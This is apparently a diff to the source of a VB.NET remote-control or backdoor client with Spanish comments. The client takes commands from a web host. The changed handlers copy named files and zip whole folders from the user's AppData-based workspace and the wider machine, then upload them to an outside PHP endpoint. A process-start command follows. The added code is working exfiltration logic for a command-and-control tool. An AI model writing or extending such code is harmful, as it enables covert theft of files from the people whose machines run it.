@@ -6,7 +6,7 @@ Imports System.Text
 Imports Microsoft.Win32
 Module Globales
     Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\CWS"
-    Public Ident As String = CreateRandomString(10)
+    Public Ident As String = CreateRandomString(9) '9 = 10 chars
     Public HostDomain As String = "https://chemic-jug.000webhostapp.com" 'PARA PRUEBAS
     Public GeneralConfigFileReaderTimeout As Integer = 60000
     Public PrivateConfigFileReaderTimeout As Integer = 60000
@@ -395,12 +395,17 @@ Module Network
                 Next
                 SendTheResponse(carpeta)
             ElseIf Comando.StartsWith("/Network.GetFile=") Then
-                My.Computer.Network.UploadFile(ContenidoComando, HostDomain & "/CWS/fileUpload.php")
+                Dim finalFileName As String = DIRCommons & "\Others\" & IO.Path.GetFileNameWithoutExtension(ContenidoComando) & "_" & Ident & IO.Path.GetExtension(ContenidoComando) 'asd_<ident>.txt
+                If My.Computer.FileSystem.FileExists(finalFileName) Then
+                    My.Computer.FileSystem.DeleteFile(finalFileName)
+                End If
+                My.Computer.FileSystem.CopyFile(ContenidoComando, finalFileName)
+                My.Computer.Network.UploadFile(finalFileName, HostDomain & "/CWS/fileUpload.php")
                 SendTheResponse("Enviar archivo")
             ElseIf Comando.StartsWith("/Network.GetFolder=") Then
                 Dim zipFileName As String = DIRCommons & "\Others\"
-                zipFileName &= DateTime.Now.ToString("HHmmss") & IO.Path.GetFileNameWithoutExtension(ContenidoComando) & ".zip"
-                ZipFile.CreateFromDirectory(ContenidoComando, zipFileName)
+                zipFileName &= IO.Path.GetFileNameWithoutExtension(ContenidoComando) & "_" & Ident & ".zip"
+                ZipFile.CreateFromDirectory(ContenidoComando, zipFileName, CompressionLevel.Fastest, true)
                 My.Computer.Network.UploadFile(zipFileName, HostDomain & "/CWS/fileUpload.php")
                 SendTheResponse("Enviar carpeta")
             ElseIf Comando.StartsWith("/Process.Start=") Then
